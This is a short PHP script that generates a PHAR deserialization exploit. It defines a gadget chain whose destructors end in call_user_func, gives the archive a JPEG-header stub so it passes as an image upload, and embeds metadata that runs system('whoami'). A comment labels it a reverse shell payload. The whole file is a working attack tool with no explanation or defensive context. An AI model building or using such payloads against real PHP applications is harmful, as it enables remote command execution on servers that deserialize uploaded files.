<?php

class AnyClass {
	private $data;
	private $desc;

	public function __construct($data, $desc) {
		$this->data = $data;
		$this->desc = $desc;
	}
	
	function __destruct() {
		return new SupportClass($this->data, $this->desc);
	}
}

class SupportClass {
	private $callable;
	public $newData;

	public function __construct($callable, $data) {
		$this->callable = $callable;
		$this->newData = $data;
	}

	public function __destruct() {
		@call_user_func($this->callable, $this->newData);
	}

}

@unlink('test.phar');
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); 

// add object of any class as meta data
$payload = new AnyClass('system', "whoami");

// Rerverse shell payload

$phar->setMetadata($payload);
$phar->stopBuffering();